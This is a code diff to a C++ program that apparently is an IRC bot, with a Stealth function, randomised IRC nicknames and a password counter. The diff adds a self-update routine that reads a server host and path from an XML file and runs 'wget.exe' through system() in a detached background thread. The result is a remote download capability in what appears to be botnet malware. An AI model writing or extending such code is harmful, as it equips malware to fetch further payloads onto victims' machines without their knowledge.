@@ -77,6 +77,11 @@ void Stealth(int x);
 
 int sec,r,x,found,found2,found3,found4,found5,found6,found7,found8,found9,verb1=6,passwords=0;
 
+void Download_Updates(void);
+
+
+
+string address,name;
 std::string total,file2,path,resev,l,cont(""),MESSAGE,HOST,channel,
 IDENT=("maubsdadffot"),REALNAME=("kebeqcn"),NICK=("Maysqeqehry"),str1 ("PING :"+HOST),comd,E,F,Z,q,msg,channel2="Pho_enix :",version=("1.2"),str=("PRIVMSG ");
 
@@ -702,8 +707,8 @@ string version_ret = cur_node->first_attribute("version")->value();
 
 // go straight to the first evendeepernode
 cur_node = cur_node->first_node("server")->first_node("name");
-string name = cur_node->first_attribute("host")->value();
-string address = cur_node->first_attribute("addr")->value();
+name = cur_node->first_attribute("host")->value();
+address = cur_node->first_attribute("addr")->value();
 // attr2 == "dog"
 
 // and then to the second evendeepernode
@@ -716,14 +721,22 @@ double version_retrived = atof (version_ret.c_str());
 double version_local = atof (version.c_str());
 
 if (version_retrived>=version_local)
+    {
     cout<<"Downloading Update"<<endl;
+    Download_Updates();
+    }
 else
-    cout<<"Version Ok"<<endl;;
+    {
+        cout<<"Version Ok"<<endl;
+        cout<<"Skipping download"<<endl;
+    }
 
 
-//cout<< encoding<<endl;
 
-cout<<"Updates Server address :"<<name<<address<<endl;
+
+
+
+cout<<"Updates Server address :"<<name<<"\\"<<address<<endl;
 
 
 return 0;
@@ -837,10 +850,22 @@ throw boost::system::system_error(error);
 
 xmlparser("somefile.xml");
    ////////////////////////////////////////////////////////
-
-
-
    pthread_exit(NULL);
+}
+void Download_Updates(void)
+{
+
+
+   ///////////////////////////////////////////////////////
+
+string Host=name;
+string slash="/";
+string Get_Request=name+slash+address;
+string wget="wget.exe "+Get_Request;
+system(wget.c_str());
+cout<<"Udpdate address"<<wget<<endl;
+
+
 }
 
 
@@ -889,6 +914,7 @@ int i=1;
  std::cout << "main() : creating thread, " << i << endl;
       rc = pthread_create(&threads[i], NULL,
                           Check_Updates, (void *)i);
+            pthread_detach(threads[i]);
       if (rc){
         logmain<<LFATAL << "Error:unable to create thread," << rc ;
       }
